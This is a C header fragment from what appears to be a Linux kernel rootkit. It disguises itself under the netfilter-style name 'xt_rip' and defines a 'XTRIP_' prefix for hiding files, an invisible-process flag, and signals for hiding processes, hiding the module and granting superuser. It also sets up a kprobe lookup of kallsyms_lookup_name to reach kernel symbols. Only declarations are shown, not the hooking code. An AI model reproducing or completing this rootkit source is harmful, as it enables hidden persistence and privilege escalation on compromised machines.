struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#ifndef MAGIC_PREFIX
#define MAGIC_PREFIX "XTRIP_"
#endif

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "xt_rip"

enum {
        SIGINVIS = 31,
        SIGSUPER = 64,
        SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif

#ifndef XTRIP_MARKER
#define XTRIP_MARKER "8231061ecdb0740331d2"
#endif

const char MARKER[] = XTRIP_MARKER;
const size_t MARKER_SIZE = sizeof MARKER - 1;

#ifndef XTRIP_BUFFER_SIZE
#define XTRIP_BUFFER_SIZE 768
#endif

const size_t BUFFER_SIZE = XTRIP_BUFFER_SIZE;
